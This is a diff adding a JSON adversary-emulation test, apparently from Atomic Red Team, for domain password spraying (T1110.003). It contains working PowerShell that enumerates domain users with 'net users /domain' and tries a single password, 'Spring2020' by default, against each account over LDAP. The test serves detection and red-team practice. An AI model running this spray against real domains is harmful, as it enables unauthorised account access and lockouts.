@@ -1,0 +1,41 @@
+{
+    "name": "Password Spray Invoke-DomainPasswordSpray Light",
+    "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray)  but without all the extra code that makes the script get blocked by many AVs.  This atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually or with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n",
+        "type": "Command Executor"
+    },
+    "id": "T1110.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Password Spraying",
+    "source": "ART",
+    "uuid": "b15bc9a5-a4f3-4879-9304-ea0011ace63a",
+    "arguments": {
+        "user_limit": {
+            "description": "The max number of users to put in the list when running the prereq_command",
+            "type": "integer",
+            "default": 200
+        },
+        "password": {
+            "description": "The password to try for each user in users.txt",
+            "type": "string",
+            "default": "Spring2020"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
+            "prereq_command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
